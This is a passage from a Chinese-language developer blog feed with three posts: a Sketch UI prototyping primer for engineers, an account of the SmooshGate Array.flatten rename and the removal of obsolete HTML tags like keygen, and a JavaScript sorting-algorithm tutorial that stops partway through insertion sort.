前言Sketch 是近來非常火紅的輕量級 UI 設計工具，簡易好上手的設計讓許多設計師紛紛從 PS 和以拉等其他工具跳槽過來，整個 Sketch 生態系也蓬勃發展。雖然筆者本業是工程師，但前陣子趁著買 Flinto （可以很輕易將 Sketch 的靜態頁面轉成 Prototype）送 Sketch 的行銷活動時同時入手了這兩套設計工具（雖然我把它當成買 Sketch 送 Flinto 啦：P），因此藉著機會分享一下給工程師的 Sketch Prototyping 簡易入門教學。當然有些讀者會疑惑：工程師學 Sketch 是要設計師搶飯碗嗎？（事實上很難啦）
一般來說，在整個產品開發的過程當中，工程師和設計師的愛恨情仇已經可以編成好幾檔連續劇了，然而溝通不良的原因除了設計流程的問題外，有很大一部分是因為對於彼此的世界不了解（一個住火星，一個住土星？）。因此工程師和設計師若是試著了解對方的語言，或許就可以降低彼此的溝通成本，從此相親相愛了呢！而天賦異秉的人甚至有機會成為新創團隊人見人愛的超全端工程師（super full-stackengineer）獨角獸，集設計、前後端、行動端、行銷業務技能於一身（咦）？好啦，言歸正傳，接下來就讓我們好好了解 Sketch 這個好用工具吧！

Sketch 基本介紹Sketch 是一個 Mac 上的輕量級介面設計工具。2010 年由荷蘭公司 Bohemian Coding 所創建，目前提供 30 天試用版，正式版 99 鎂（教育價5折優惠），不過目前只有提供 Mac 版本，所以只能先跟使用其他作業系統的朋友說聲 Sorry 啦！
究竟 Sketch 有哪些優點，讓許多設計師因此琵琶別抱呢？
Sketch 優點
活躍的第三方套件生態系！
專為 UI 設計而生（Artboard 設計可以方便 UI 設計） 
輕量級，簡單好上手（工程師 OS：就像 Sublime 之於 Eclipse）
內建和可擴充的豐富 UI 模版（iOS、Material Design 等）
搭配 Flinto、Zeplin 可讓工程師更開心，設計師提早下班
可以取代大部分 PS、以拉、Fireworks 等功能
知名網路、科技公司都在用

看完了 Sketch 優點，相信讀者們一定摩拳擦掌準備牛刀小試啦！
使用 Sketch 設計 Mobile App UI一般設計流程我們通常會有以下三種階段：

Wireframe（線框圖）保真度低（low fidelity ）、修改成本低。適合初期討論產品架構和基本功能。通常使用紙筆手繪，但建議於完成後電子化
Mockup（視覺稿）保真度中（middle fidelity ）、修改成本中。於 Mockup 階段著重於整體視覺、排版的靜態討論和確認，而 Sketch 主要會是在 Mockup 階段進行設計
Prototype（原型）保真度高（high fidelity ），接近最終產品、修改成本高。確認互動設計的流程並確認架構和視覺規劃是否有需要調整之處

先介紹一下 Sketch 工作空間，左邊是圖層區，右邊是屬性、中間是工作區、上面是工具欄：

工具欄可以點擊右鍵自定義：

由於 UI 設計是 Sketch 主要的強項（尤其是行動端），在 Sketch 中 Artboard 是基礎的設計單元（成果展示區域），我們可以在一個 Page 中定義多個 Artboard。根據 Sketch 的設計，我們可以一次瀏覽多個 Artboard（也可說是多個介面），這樣可以更清楚整個設計 flow ，這是 Sketch 蠻大的一個優點（一覽眾山小？）。
現在，我們終於開始設計我們的新 App UI 啦！首先，我們透過左上方的新增按鈕新增了一個 Artboard ，並選擇了 iPhone6 當做設計基底（有 iPhone、Android、RWD等可以選）。接下來我們要打開在 Sketch 中內建的元件模版，iOS 和 Material Design、icon設計等（網路上也有很多網友提供自己的設計可以下載），這邊因為是使用 iPhone6 的 Artboard，因此我們打開 iOS 元件模版。



接下來進行複製貼上大法！將元件複製到 Artboard 上就可以了！現在小工程師也可以設計簡單的 UI 啦！可以透過右上角工具預覽或是分享的方式看到成果！

從 Mockup 到 Prototype透過 Sketch 設計完成靜態檔案，若我們想將靜態檔案轉成 Prototype 進行使用者測試，我們可以使用 Flinto 好工具！透過簡單的連結就可以讓你的 Sketch 動起來啦（目前支援了簡單的手勢和動畫）！



結論以上就是給工程師的 Sketch Prototyping 簡易入門教學。事實上透過整合 Zeplin（可以方便註解和查詢設計相對位置和色碼）、Invision（支援變更記錄，可以當做版本控管使用）等工具進行協作，還可以更加加快整個產品設計流程。透過前期的完善溝通討論，不但可以降低後續的溝通成本更可以讓完成的產品更接近最初的設計，更重要的是讓工程師和設計師的感情更好了！若你對於 Sketch 有興趣可以參考這份投影片有更完整的教學介紹。另外也可以參考官方教學影片。最後再次強調工程師學 Sketch 並非要去搶設計師搶飯碗。而是工程師和設計師若是試著了解對方的語言，或許就可以降低彼此的溝通成本。同理也建議設計師們可以去試著學一些簡單的程式語言基礎概念。筆者才疏學淺，若讀者有任何學習心得也歡迎分享交流：）

常用外掛
外掛管理工具 Sketch Toolbox
Notebook 註解好幫手
Sketch Flinto 從 Mockup 到 Prototype
Content Generator Sketch Plugin 生成假資料
Sketch Measure 測量位置、大小
Icon Stamper 簡單生成不同大小 icon

延伸閱讀
Sketch 簡體中文教學
Sketch 問答

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Sketch, Prototyping, Wireframe, Mockup</tag>
      </tags>
  </entry>
  <entry>
    <title>Don’t break the Web：以 SmooshGate 以及 keygen 為例</title>
    <url>/2019/11/30/smooshgate-and-keygen/</url>
    <content><![CDATA[前言最近 YDKJS（You Don’t Know JS 的縮寫，中譯版翻成：你所不知道的JS）有了第二版，名叫 YDKJSY，Y 是 Yet 的意思（中文版可能可以翻叫：你還是不知道的 JS）。這個第二版還沒全部完成，但在 GitHub 上面已經公開了最前面的一些章節。
搶先讀了一下第一章，在講與 JS 相關的歷史，其中提到一段讓我很感興趣的議題：

 As such, sometimes the JS engines will refuse to conform to a specification-dictated change because it would break that web content.


In these cases, often TC39 will backtrack and simply choose to conform the specification to the reality of the web. For example, TC39 planned to add a contains(..) method for Arrays, but it was found that this name conflicted with old JS frameworks still in use on some sites, so they changed the name to a non-conflicting includes(..). The same happened with a comedic&#x2F;tragic JS community crisis dubbed “smooshgate”, where the planned flatten(..) method was eventually renamed flat(..).

大意是在說有時候 JS 的規格必須跟現實（已經存在的那些舊的實作）妥協。例如說原本 Array 要加上一個叫做 contains 的 method，但因為會有問題所以改叫 includes，flatten 也改名叫做 flat。
還有一個上面特別標起來的詞「smooshgate」，用這個當關鍵字去找才發現是去年三月左右發生的事件，至於發生了什麼，底下會詳述，跟上面提的 flatten 有關。看到有這件事的時候我第一個反應是：「咦，我怎麼什麼都不知道？」，查了一下繁體中文的資料，大概也只有這篇有提到：SmooshGate，以及[筆記] 3 種 JavaScript 物件屬性的特性這篇有擦到邊而已。
在仔細研究了一下事情的來龍去脈之後，覺得是個滿有趣的議題，因此寫了這篇跟大家分享。


SmooshGate 事件有關這個事件以及這篇文章的靈感，大多數來自於：#SmooshGate FAQ 這篇文章，裡面其實解釋得很好，建議大家可以去看這篇。
但懶得看也沒關係，底下我簡單講一下事情的來龍去脈。
有一個組織叫做 TC39，全名為 Technical Committee 39，第 39 號技術委員會，負責與 ECMAScript 規範相關的事項，例如說決定哪些提案可以過關之類的，而最後那些提案就會被納入新的 ECMAScript 標準之中。
提案一共分成五個 stage，從 stage0 到 stage4，詳情我就不多說明了，可以參考 Championing a proposal at TC39 或是 The TC39 Process。
TC39 之前有一個提案是 Array.prototype.{flatten,flatMap}（flatten 現在已經改為 flat）。
這邊先幫不清楚什麼是 flatten 的讀者簡單介紹一下它的功用，簡單來說就是把巢狀的東西攤平。
例如說底下範例：
let arr = [1, 2, [3], [4], [5, 6, 7]]console.log(arr.flatten()) // [1, 2, 3, 4, 5, 6, 7]

原本巢狀的陣列會被攤平，這就是 flatten 的意思，跟 lodash 裡面的 flatten 是差不多的。
詳細的使用方法可以參考 MDN，就只是多了一個參數 depth 可以讓你指定展開的深度。
而 flatMap 就是先 map 之後再 flat，熟悉 RxJS 的朋友們應該會感到滿親切的（在 RxJS 裡面又稱作 mergeMap，而且 mergeMap 比較常用，有興趣的朋友也可以參考這篇：concatAll and concatMap rather than flatten and flatMap）。
好，這個提案看似很不錯，但到底會有什麼問題呢？
問題就出在一個前端新鮮人可能沒聽過的工具：MooTools，而我也只有聽過而已，完全沒用過。想要快速知道它可以幹嘛的，請看這篇十年前的比較文：jQuery vs MooTools。
在 MooTools 裡面，他們定義了自己的 flatten method，在 code 裡面做了類似下面的事：
Array.prototype.flatten = /* ... */;

這聽起來沒什麼問題，因為就算 flatten 正式列入標準並且變成原生的 method，也只是把它覆蓋掉而已，沒事兒沒事兒。
但麻煩的事情是，MooTools 還有一段 code 是把 Array 的 method 都複製到 Elements（MooTools 自定義的 API）上面去：
for (var key in Array.prototype) &#123;  Elements.prototype[key] = Array.prototype[key];&#125;

for…in 這個語法會遍歷所有可列舉的（enumerable）屬性，而原生的 method 並不包含在裡面。
例如說在 Chrome devtool 的 console 執行以下這段 code：
for (var key in Array.prototype) &#123;  console.log(key)&#125;

會發現什麼都沒有印出來。
但如果你加上了幾個自定義的屬性之後：
Array.prototype.foo = 123Array.prototype.sort = 456Array.prototype.you_can_see_me = 789for (var key in Array.prototype) &#123;  console.log(key) // foo, you_can_see_me&#125;

會發現只有自定義的屬性會是 enumerable 的，而原生的方法你就算覆寫，也還是不會變成 enumerable。
那問題是什麼呢？問題就出在當 flatten 還沒正式變成 Array 的 method 時，它就只是一個 MooTools 自定義的屬性，是 enumerable 的，所以會被複製到 Elements 去。但是當 flatten 納入標準並且被瀏覽器正式支援以後，flatten 就不是 enumerable 的了。
意思就是，Elements.prototype.flatten 就會變成 undefined，所有使用到這個 method 的 code 都會掛掉。
此時天真的你可能會想說：「那就把 flatten 變成 enumerable 的吧！」，但這樣搞不好會產生更多問題，因為一堆舊的 for…in 就會突然多出一個 flatten 的屬性，很有可能會造成其他的 bug。
當初發現這個 bug 的討論串可以看這裡：Implementing array.prototype.flatten broke MooTools’ version of it.
確認有了這個問題以後，大家就開始討論要把 flatten 換成什麼詞，有人在 Issues 裡面提議說：rename flatten to smoosh，引起了廣大討論，也就是 #SmooshGate 事件的起源。除了討論改名以外，也有人認為乾脆就讓那些網站壞掉好了。
smoosh 這個字其實跟 flatten 或是其他人提議的 squash 差不多，都有把東西弄平的意思在，不過這個字實在是非常少見，聽到這事件以前我也完全沒聽過這個單字。不過這個提議其實從來沒有正式被 TC39 討論過就是了。
TC39 在 2018 年 5 月的會議上，正式把 flatten 改成 flat，結束了這個事件。
這個提案的時間軸大概是這樣：

2017 年 7 月：stage 0
2017 年 7 月：stage 1
2017 年 9 月：stage 2
2017 年 11 月：stage 3
2018 年 3 月：發現 flatten 會讓 MooTools 壞掉
2018 年 3 月：有人提議改名為 smoosh
2018 年 5 月：flatten 改名為 flat
2019 年 1 月：stage 4

我因為好奇去找了 V8 的 commit 來看，V8 是在 2018 年 3 月的時候實作這個功能的：[esnext] Implement Array.prototype.{flatten,flatMap}，其中我覺得最值得大家學習的其實是測試的部分：
const elements = new Set([  -Infinity,  -1,  -0,  +0,  +1,  Infinity,  null,  undefined,  true,  false,  &#x27;&#x27;,  &#x27;foo&#x27;,  /./,  [],  &#123;&#125;,  Object.create(null),  new Proxy(&#123;&#125;, &#123;&#125;),  Symbol(),  x =&gt; x ** 2,  String]);  for (const value of elements) &#123;  assertEquals(    [value].flatMap((element) =&gt; [element, element]),    [value, value]  );&#125;

直接丟了各種奇形怪狀的東西進去測。
在 flatten 改名為 flat 的隔天，V8 也立刻做出修正：[esnext] Rename Array#flatten to flat。
簡單總結一下，總之 #SmooshGate 事件就是：

有人提議新的 method：Array.prototype.flatten
發現會讓 MooTools 壞掉，因此要改名
有人提議改名 smoosh，也有人覺得不該改名，引起一番討論
TC39 決議改成 flat，事情落幕

其中的第二點可能有些人會很疑惑，想說 MooTools 都是這麼古早的東西了，為什麼不直接讓它壞掉就好，反正都是一些老舊的網站了。
這就要談論到制定 Web 相關標準時的原則了：Don’t break the web。
Don’t break the Web這個網站：Space Jam 過了 22 年，依舊可以順利執行，就是因為在制定網頁相關新標準時都會注意到「Don’t break the Web」這個大原則。
仔細想想，好像會發現 Web 的領域沒有什麼 breaking change，你以前可以用的 JS 語法現在還是可以用，只是多了一些新的東西，而不是把舊的東西改掉或者是拿掉。
因為一旦出現 breaking change，就可能會有網站遭殃，像是出現 bug 甚至是整個壞掉。其實有很多網站好幾年都沒有在維護了，但我們也不應該讓它就這樣壞掉。如果今天制定新標準時有了 breaking change，最後吃虧的還是使用者，使用者只會知道網站壞了，卻不知道是為什麼壞掉。
所以在 SmooshGate 事件的選擇上，比起「flatten 就是最符合語義，讓那些使用 MooTools 的老舊網站壞掉有什麼關係！」，TC39 最終選擇了「把 flatten 改一下名字就好，雖然不是最理想的命名，但我們不能讓那些網頁壞掉」。
不過話雖如此，這不代表糟糕的設計一旦出現以後，就完全沒有辦法被移除。
事實上，有些東西就悄悄地被移除掉了，但因為這些東西太過冷門所以你我可能都沒注意到。
WHATWG 的 FAQ 有寫到：

That said, we do sometimes remove things from the platform! This is usually a very tricky effort, involving the coordination among multiple implementations and extensive telemetry to quantify how many web pages would have their behavior changed. But when the feature is sufficiently insecure, harmful to users, or is used very rarely, this can be done. And once implementers have agreed to remove the feature from their browsers, we can work together to remove it from the standard.

底下有提到了兩個範例：&lt;applet&gt; 與 &lt;keygen&gt;。
也是因為好奇，所以我又去找了一些相關資料來看。
被淘汰的 HTML 標籤有聽過&lt;keygen&gt;這個標籤的請舉手一下？舉手的人麻煩大家幫他們鼓鼓掌，你很厲害，封你為冷門 HTML 標籤之王。
我就算看了 MDN 上面的範例，也沒有很清楚這個標籤在幹嘛。只知道這是一個可以用在表單裡的標籤，人如其名，是用來產生與憑證相關的 key 用的。
從 MDN 給的資料 Non-conforming features 裡面，我們可以進一步找到其他也被淘汰的標籤，例如說：

applet
acronym
bgsound
dir
isindex
keygen
nextid

不過被標示為 obsolete 不代表就沒有作用，應該只是說明你不該再使用這些標籤，因為我猜根據 don’t break the web 的原則，裡面有些標籤還是可以正常運作，例如說小時候很愛用的跑馬燈 marquee 也在 Non-conforming features 裡面。 
在另外一份 DOM 相關的標準當中，有說明了該如何處理 HTML 的 tag，我猜這些才是真的被淘汰而且沒作用的標籤：

If name is applet, bgsound, blink, isindex, keygen, multicol, nextid, or spacer, then return HTMLUnknownElement.

如果你拿這些標籤到 Chrome 上面去試，例如說這樣：
&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;bgsound&gt;123&lt;/bgsound&gt;    &lt;isindex&gt;123&lt;/isindex&gt;    &lt;multicol&gt;123&lt;/multicol&gt;    &lt;foo&gt;123&lt;/foo&gt;  &lt;/body&gt;&lt;/html&gt;

就會發現表現起來跟&lt;span&gt;差不多，猜測 Chrome 應該會把這些不認識的 tag 當作 span 來看待。
再來因為好奇，所以也去找了一下 chromium 裡相關的程式碼，我以前都是直接在 GitHub 上面去搜尋 code 的內容，但因為這次要搜的關鍵字重複性太高，因此改成搜 commit message。這個時候就完全突顯 commit message 的重要性了，發現 chromium 的 commit message 寫得滿好的。
例如說這個 commit：Remove support for the obsolete  tag.
This patch removes all special-casing for the &lt;isindex&gt; tag; itnow behaves exactly like &lt;foo&gt; in all respects. This additionallymeans that we can remove the special-casing for forms containing&lt;input name=&quot;isindex&quot;&gt; as their first element.  The various tests for &lt;isindex&gt; have been deleted, with theexception of the imported HTML5Lib tests. It&#x27;s not clear thatwe should send them patches to remove the &lt;isindex&gt; tests, atleast not while the element is (an obsolete) part of HTML5, andsupported by other vendors.  I&#x27;ve just landed failing test results here. That seems likethe right thing to do.  &quot;Intent to Remove&quot; discussion: https://groups.google.com/a/chromium.org/d/msg/blink-dev/14q_I06gwg8/0a3JI0kjbC0J

有附上當初的討論串，資訊給的很詳細。而 code 的改動除了測試的部分以外，就是把有關這個 tag 的地方都刪掉，當作是一個不認識的 tag，所以 message 才會說：「it now behaves exactly like &lt;foo&gt; in all respects.」
再來我們看另外一個 commit：Remove support for the keygen tag
This removes support for &lt;keygen&gt; by updating itto be an HTMLUnknownElement. As a result, it&#x27;sno longer a form-associated element and nolonger has IDL-assigned properties.  The &lt;keygen&gt; tag is still left in the parser,similar to &lt;applet&gt;, so that it maintains thedocument parse behaviours (such as self-closing),but is otherwise a neutered element.  Tests that were relying on &lt;keygen&gt; having itsown browser-created shadow root (for its customselect element) have been updated to useprogress bars, while other tests (such as&lt;keygen&gt;-related crash tests) have beenfully removed.  As Blink no longer treats this tag as special,all the related IPC infrastructure is removed,including preferences and enterprise flags,and all localized strings, as they&#x27;re all nowunreachable.  This concludes the &quot;Intent to Remove&quot; threadfor &lt;keygen&gt; athttps://groups.google.com/a/chromium.org/d/msg/blink-dev/z_qEpmzzKh8/BH-lkwdgBAAJ

因為&lt;keygen&gt;這個 tag 原本的處理就比較複雜，比起剛剛的&lt;isindex&gt;，改動的檔案多了很多，看起來是把相關的東西全部都拿掉了。
最後來看這一個：bgsound must use the HTMLUnknownElement interface
As specified here:https://html.spec.whatwg.org/#bgsound  This causes one less fail on:http://w3c-test.org/html/semantics/interfaces.html

裡面給的測試連結：Test of interfaces 滿有趣的，會去測試一大堆元素的 interface 是不是正確的，在 interfaces.js 裡面可以看到它測試的列表：
var elements = [  [&quot;a&quot;, &quot;Anchor&quot;],  [&quot;abbr&quot;, &quot;&quot;],  [&quot;acronym&quot;, &quot;&quot;],  [&quot;address&quot;, &quot;&quot;],  [&quot;applet&quot;, &quot;Unknown&quot;],  [&quot;area&quot;, &quot;Area&quot;],  [&quot;article&quot;, &quot;&quot;],  [&quot;aside&quot;, &quot;&quot;],  [&quot;audio&quot;, &quot;Audio&quot;],  [&quot;b&quot;, &quot;&quot;],  [&quot;base&quot;, &quot;Base&quot;],  [&quot;basefont&quot;, &quot;&quot;],  [&quot;bdi&quot;, &quot;&quot;],  [&quot;bdo&quot;, &quot;&quot;],  [&quot;bgsound&quot;, &quot;Unknown&quot;],  [&quot;big&quot;, &quot;&quot;],  [&quot;blink&quot;, &quot;Unknown&quot;],  [&quot;blockquote&quot;, &quot;Quote&quot;],  [&quot;body&quot;, &quot;Body&quot;],  [&quot;br&quot;, &quot;BR&quot;],  [&quot;button&quot;, &quot;Button&quot;],  [&quot;canvas&quot;, &quot;Canvas&quot;],  [&quot;caption&quot;, &quot;TableCaption&quot;],  [&quot;center&quot;, &quot;&quot;],  [&quot;cite&quot;, &quot;&quot;],  [&quot;code&quot;, &quot;&quot;],  [&quot;col&quot;, &quot;TableCol&quot;],  [&quot;colgroup&quot;, &quot;TableCol&quot;],  [&quot;command&quot;, &quot;Unknown&quot;],  [&quot;data&quot;, &quot;Data&quot;],  [&quot;datalist&quot;, &quot;DataList&quot;],  [&quot;dd&quot;, &quot;&quot;],  [&quot;del&quot;, &quot;Mod&quot;],  [&quot;details&quot;, &quot;Details&quot;],  [&quot;dfn&quot;, &quot;&quot;],  [&quot;dialog&quot;, &quot;Dialog&quot;],  [&quot;dir&quot;, &quot;Directory&quot;],  [&quot;directory&quot;, &quot;Unknown&quot;],  [&quot;div&quot;, &quot;Div&quot;],  [&quot;dl&quot;, &quot;DList&quot;],  [&quot;dt&quot;, &quot;&quot;],  [&quot;em&quot;, &quot;&quot;],  [&quot;embed&quot;, &quot;Embed&quot;],  [&quot;fieldset&quot;, &quot;FieldSet&quot;],  [&quot;figcaption&quot;, &quot;&quot;],  [&quot;figure&quot;, &quot;&quot;],  [&quot;font&quot;, &quot;Font&quot;],  [&quot;foo-BAR&quot;, &quot;Unknown&quot;], // not a valid custom element name  [&quot;foo-bar&quot;, &quot;&quot;], // valid custom element name  [&quot;foo&quot;, &quot;Unknown&quot;],  [&quot;footer&quot;, &quot;&quot;],  [&quot;form&quot;, &quot;Form&quot;],  [&quot;frame&quot;, &quot;Frame&quot;],  [&quot;frameset&quot;, &quot;FrameSet&quot;],  [&quot;h1&quot;, &quot;Heading&quot;],  [&quot;h2&quot;, &quot;Heading&quot;],  [&quot;h3&quot;, &quot;Heading&quot;],  [&quot;h4&quot;, &quot;Heading&quot;],  [&quot;h5&quot;, &quot;Heading&quot;],  [&quot;h6&quot;, &quot;Heading&quot;],  [&quot;head&quot;, &quot;Head&quot;],  [&quot;header&quot;, &quot;&quot;],  [&quot;hgroup&quot;, &quot;&quot;],  [&quot;hr&quot;, &quot;HR&quot;],  [&quot;html&quot;, &quot;Html&quot;],  [&quot;i&quot;, &quot;&quot;],  [&quot;iframe&quot;, &quot;IFrame&quot;],  [&quot;image&quot;, &quot;Unknown&quot;],  [&quot;img&quot;, &quot;Image&quot;],  [&quot;input&quot;, &quot;Input&quot;],  [&quot;ins&quot;, &quot;Mod&quot;],  [&quot;isindex&quot;, &quot;Unknown&quot;],  [&quot;kbd&quot;, &quot;&quot;],  [&quot;keygen&quot;, &quot;Unknown&quot;],  [&quot;label&quot;, &quot;Label&quot;],  [&quot;legend&quot;, &quot;Legend&quot;],  [&quot;li&quot;, &quot;LI&quot;],  [&quot;link&quot;, &quot;Link&quot;],  [&quot;listing&quot;, &quot;Pre&quot;],  [&quot;main&quot;, &quot;&quot;],  [&quot;map&quot;, &quot;Map&quot;],  [&quot;mark&quot;, &quot;&quot;],  [&quot;marquee&quot;, &quot;Marquee&quot;],  [&quot;menu&quot;, &quot;Menu&quot;],  [&quot;meta&quot;, &quot;Meta&quot;],  [&quot;meter&quot;, &quot;Meter&quot;],  [&quot;mod&quot;, &quot;Unknown&quot;],  [&quot;multicol&quot;, &quot;Unknown&quot;],  [&quot;nav&quot;, &quot;&quot;],  [&quot;nextid&quot;, &quot;Unknown&quot;],  [&quot;nobr&quot;, &quot;&quot;],  [&quot;noembed&quot;, &quot;&quot;],  [&quot;noframes&quot;, &quot;&quot;],  [&quot;noscript&quot;, &quot;&quot;],  [&quot;object&quot;, &quot;Object&quot;],  [&quot;ol&quot;, &quot;OList&quot;],  [&quot;optgroup&quot;, &quot;OptGroup&quot;],  [&quot;option&quot;, &quot;Option&quot;],  [&quot;output&quot;, &quot;Output&quot;],  [&quot;p&quot;, &quot;Paragraph&quot;],  [&quot;param&quot;, &quot;Param&quot;],  [&quot;picture&quot;, &quot;Picture&quot;],  [&quot;plaintext&quot;, &quot;&quot;],  [&quot;pre&quot;, &quot;Pre&quot;],  [&quot;progress&quot;, &quot;Progress&quot;],  [&quot;q&quot;, &quot;Quote&quot;],  [&quot;quasit&quot;, &quot;Unknown&quot;],  [&quot;rb&quot;, &quot;&quot;],  [&quot;rp&quot;, &quot;&quot;],  [&quot;rt&quot;, &quot;&quot;],  [&quot;rtc&quot;, &quot;&quot;],  [&quot;ruby&quot;, &quot;&quot;],  [&quot;s&quot;, &quot;&quot;],  [&quot;samp&quot;, &quot;&quot;],  [&quot;script&quot;, &quot;Script&quot;],  [&quot;section&quot;, &quot;&quot;],  [&quot;select&quot;, &quot;Select&quot;],  [&quot;slot&quot;, &quot;Slot&quot;],  [&quot;small&quot;, &quot;&quot;],  [&quot;source&quot;, &quot;Source&quot;],  [&quot;spacer&quot;, &quot;Unknown&quot;],  [&quot;span&quot;, &quot;Span&quot;],  [&quot;strike&quot;, &quot;&quot;],  [&quot;strong&quot;, &quot;&quot;],  [&quot;style&quot;, &quot;Style&quot;],  [&quot;sub&quot;, &quot;&quot;],  [&quot;summary&quot;, &quot;&quot;],  [&quot;sup&quot;, &quot;&quot;],  [&quot;table&quot;, &quot;Table&quot;],  [&quot;tbody&quot;, &quot;TableSection&quot;],  [&quot;td&quot;, &quot;TableCell&quot;],  [&quot;textarea&quot;, &quot;TextArea&quot;],  [&quot;tfoot&quot;, &quot;TableSection&quot;],  [&quot;th&quot;, &quot;TableCell&quot;],  [&quot;thead&quot;, &quot;TableSection&quot;],  [&quot;time&quot;, &quot;Time&quot;],  [&quot;title&quot;, &quot;Title&quot;],  [&quot;tr&quot;, &quot;TableRow&quot;],  [&quot;track&quot;, &quot;Track&quot;],  [&quot;tt&quot;, &quot;&quot;],  [&quot;u&quot;, &quot;&quot;],  [&quot;ul&quot;, &quot;UList&quot;],  [&quot;var&quot;, &quot;&quot;],  [&quot;video&quot;, &quot;Video&quot;],  [&quot;wbr&quot;, &quot;&quot;],  [&quot;xmp&quot;, &quot;Pre&quot;],  [&quot;\u00E5-bar&quot;, &quot;Unknown&quot;], // not a valid custom element name];

像是 applet、bgsound、blink 等等這些元素，就應該回傳 HTMLUnknownElement。
總結這一趟旅程一樣收穫滿滿，從一個議題持續向外延伸，就能挖到更多有趣的東西。
例如說我們從 SmooshGate 事件，學到了 TC39 的運作流程、flatten 壞掉的原因以及 V8 當初實作 flatten 的 commit 還有學到怎麼寫測試。也學習到了 don’t break the web 的原則，再從這個原則去看了 HTML 的規格，看到了那些被淘汰的 tag，最後去看了在 chromium 裡面怎麼做處理。
制定規格的人要注重的層面以及要考慮的問題真的很多，因為一旦做下去，就很難再回頭了；規格書也要寫得清楚又明白，而且不能有錯誤。
真心佩服那些制定標準的人。
參考資料：

You Don’t Know JS Yet: Get Started - 2nd Edition Chapter 1: What Is JavaScript?
SmooshGate
#SmooshGate FAQ
Non-conforming features
3.2.2 Elements in the DOM

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>一起用 JavaScript 來複習經典排序法吧！</title>
    <url>/2017/08/19/sotring-algorithm/</url>
    <content><![CDATA[前言最近剛好上到 CS50 Week3，這一週的主題是：Algorithms，裡面介紹到了幾種經典的排序法，像是選擇排序、泡沫排序、插入排序以及合併排序。
我覺得身為一個軟體工程師，大概一輩子都脫離不了排序了，畢竟這是經典演算法之一嘛！與其每次要面試之前都凌亂的準備，不如現在就整理出一篇，紀錄一下各個排序法的心得，幫自己做個統整。
因此，這一篇將利用 JavaScript 來實作各個經典排序演算法。
這次實做的排序法都會是由小到大排序，並且為了方便起見，每一個排序法「都會直接更改原本的 array」，但如果你不想改到原本的也很簡單，在每一個的函式最開頭加上：arr = arr.slice()複製一份原本的即可。
還有，因為文章裡面比較難放動畫，所以我只能放一些圖片而已，若是想搭配視覺化演算法一起學習的話，我非常推薦 VISUALGO，這網站絕對會讓你對排序的理解度更上一層樓。
選擇排序法（Selection Sort）選擇排序是我認為最好理解的排序法，因為它的原理超級簡單：

找到最小值，移到最左邊。

當你第一輪跑完之後，你就找到整個陣列的最小值了，然後你把尋找範圍從 0 ~ n-1 變成 1 ~ n-1，重複做一樣的事情就可以了。或是，你也可以想成是：找到最小值，第二小值，第三小值…第 n 小值。
（圖片來源：http://cheetahonfire.blogspot.sg/2009/05/selection-sort-vs-insertion-sort.html ）
const selectionSort = (arr) =&gt; &#123;  const length = arr.length;    // 有幾個元素，就要找幾輪的最小值  // 這邊的 i 代表 i 以前的元素都排序好了  for (let i = 0; i &lt; length; i++) &#123;      // 先預設第一個是最小的    let min = arr[i];    let minIndex = i;      // 從還沒排好的元素開始找最小值    for (let j = i; j &lt; length; j++) &#123;      if (arr[j] &lt; min) &#123;        min = arr[j];        minIndex = j;      &#125;    &#125;      // ES6 的用法，交換兩個數值    [arr[minIndex], arr[i]] = [arr[i], arr[minIndex]];  &#125;  return arr;&#125;

時間複雜度就是大家所熟知的 O(n^2)，最好、最壞、平均都是一樣的，因為無論原本的陣列長怎樣，都要經過這麼多輪比較。
泡沫排序法（Bubble Sort）泡沫排序應該是很多人第一個接觸的排序法，原理也很簡單好懂：

跟隔壁互相比較，順序錯了就交換，讓大的元素一直浮到最後

就是這樣交換的過程，才讓它稱為「泡沫」排序法，因為元素很像「浮」了上來。
（圖片來源：http://www.opentechguides.com/how-to/article/c/51/bubble-sort-c.html ）
const bubbleSort = (arr) =&gt; &#123;  const n = arr.length;    // 一共要跑 n 輪  for (let i = 0; i &lt; n; i++) &#123;      // 從第一個元素開始，不斷跑到第 n - 1 - i 個    // 原本是 n - 1，會再加上 - i 是因為最後 i 個元素已經排好了    // 所以沒必要跟那些排好的元素比較    for (let j = 0; j &lt; n - 1 - i; j++) &#123;      if (arr[j] &gt; arr[j + 1]) &#123;        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];      &#125;    &#125;  &#125;    return arr;&#125;

雖然泡沫排序法的平均跟最壞時間複雜度都是O(n^2)，但值得注意的是 best case，出現在輸入的陣列已經是排序好的情況下。在這種情況下呢，時間複雜度是 O(n)，不會做任何的交換。
但是呢，如果你要做到最優的情形是 O(n)，你必須要加上一個小優化才行。不然以我們上面的情況，雖然不會做任何交換，但還是會把每一個元素都 check 一遍。
可以加上一個 flag 標注內圈有沒有交換的情形發生，如果沒有，就代表陣列已經排序好了，就可以直接跳掉。
function optimzedBubbleSort = (arr) =&gt; &#123;  const  n = arr.length;  let swapped = true;    // 一共要跑 n 輪  for (let i = 0; i &lt; n &amp;&amp; swapped; i++) &#123;      // 從第一個元素開始，不斷跑到第 n - 1 - i 個    // 原本是 n - 1，會再加上 - i 是因為最後 i 個元素已經排好了    // 所以沒必要跟那些排好的元素比較    swapped = false;    for (let j = 0; j &lt; n - 1 - i; j++) &#123;      if (arr[j] &gt; arr[j + 1]) &#123;        swapped = true;        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];      &#125;    &#125;  &#125;  return arr;&#125;

改良之後，如果輸入是已經排好的陣列，就只會跑一次內圈，然後就跳掉了，所以時間複雜度會是O(n)。
插入排序法（Insertion Sort）插入排序法是我認為相當直覺的一個排序法，簡單來說就是：

你玩撲克牌的時候會用到的排序法

就是不斷把撲克牌插入到適合的位置嘛，只是你玩牌的時候可能一次插入好多牌，而插入排序法是一次插入一張牌。
（圖片來源：https://commons.wikimedia.org/wiki/File:Insertion-sort-example.gif ）
這邊比較值得注意的是在插入時候的演算法，不斷往前找到適合的位置，並且在邊找的時候就邊挪動元素了，所以等找到的時候就可以直接插入。
